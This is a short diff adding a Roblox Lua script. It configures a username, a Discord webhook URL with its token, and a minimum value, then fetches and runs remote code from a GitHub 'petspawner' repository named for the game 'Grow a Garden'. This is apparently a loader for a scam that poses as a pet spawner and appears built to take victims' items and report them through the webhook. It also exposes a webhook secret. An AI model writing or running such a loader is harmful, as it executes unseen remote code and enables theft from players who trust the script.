@@ -1,0 +1,5 @@
+Username = "fillekingbus12"
+Webhook = "https://discord.com/api/webhooks/1392038432167039026/VkVYUvAFpnqVehPd2-uql9QVpFbf-OI4G0QmtkOxOQ4Syifm7iaFaGj0CzqE6YBCGovY"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
